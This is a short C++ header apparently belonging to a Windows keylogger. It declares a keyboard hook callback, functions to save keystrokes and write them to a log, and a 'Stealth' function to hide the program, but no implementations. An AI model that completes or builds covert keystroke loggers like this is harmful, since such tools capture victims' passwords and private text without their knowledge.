#pragma once
#include <windows.h>
#include <iostream>

int Save(int key_stroke);
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
void SetHook();
void ReleaseHook();
void Stealth();
BOOL WriteLog(const std::string& contents);